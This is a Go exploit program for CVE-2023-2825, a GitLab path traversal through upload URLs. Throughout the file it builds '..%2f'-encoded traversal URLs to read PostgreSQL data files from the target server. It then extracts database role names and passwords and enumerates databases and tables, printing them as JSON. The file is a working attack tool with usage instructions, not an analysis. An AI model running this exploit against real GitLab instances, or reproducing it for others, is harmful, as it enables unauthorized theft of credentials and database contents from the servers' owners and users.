package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	"github.com/Chocapikk/pgread/pgdump"
)

type Result struct {
	Credentials []string            `json:"credentials"`
	Databases   map[string][]string `json:"databases"`
}

func main() {
	if len(os.Args) < 3 {
		fmt.Fprintln(os.Stderr, "usage: exploit <gitlab-url> <upload-path>")
		fmt.Fprintln(os.Stderr, "example: exploit http://localhost:8080 /group1/group2/group3/group4/group5/project/uploads/abc123/file.txt")
		os.Exit(1)
	}

	// CVE-2023-2825: GitLab path traversal via uploads
	read := pathTraversalReader(os.Args[1], os.Args[2], "/var/lib/postgresql/data")
	result := Result{Databases: make(map[string][]string)}

	if passwords, err := pgdump.ExtractPasswordsFromFiles(read); err == nil {
		for _, p := range passwords {
			if p.Password != "" {
				result.Credentials = append(result.Credentials, p.RoleName+":"+p.Password)
			}
		}
	}

	if dbData, err := read(fmt.Sprintf("global/%d", pgdump.PGDatabase)); err == nil {
		for _, db := range pgdump.ParsePGDatabase(dbData) {
			if strings.HasPrefix(db.Name, "template") {
				continue
			}
			base := fmt.Sprintf("base/%d", db.OID)
			classData, _ := read(base + fmt.Sprintf("/%d", pgdump.PGClass))
			attrData, _ := read(base + fmt.Sprintf("/%d", pgdump.PGAttribute))
			if dump, _ := pgdump.DumpDatabaseFromFiles(classData, attrData, func(fn uint32) ([]byte, error) {
				return read(fmt.Sprintf("%s/%d", base, fn))
			}, nil); dump != nil {
				for _, t := range dump.Tables {
					result.Databases[db.Name] = append(result.Databases[db.Name], fmt.Sprintf("%s (%d rows)", t.Name, len(t.Rows)))
				}
			}
		}
	}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	enc.Encode(result)
}

func pathTraversalReader(target, uploadPath, pgdata string) func(string) ([]byte, error) {
	// uploadPath: /g1/g2/g3/g4/g5/project/uploads/<hash>/filename
	base := strings.TrimSuffix(target, "/")
	idx := strings.LastIndex(uploadPath, "/")
	prefix := uploadPath[:idx] // Remove filename, keep up to hash
	traversal := strings.Repeat("..%2f", 15)

	return func(path string) ([]byte, error) {
		url := base + prefix + "/" + traversal + pgdata + "/" + path
		resp, err := http.Get(url)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("%d", resp.StatusCode)
		}
		return io.ReadAll(resp.Body)
	}
}
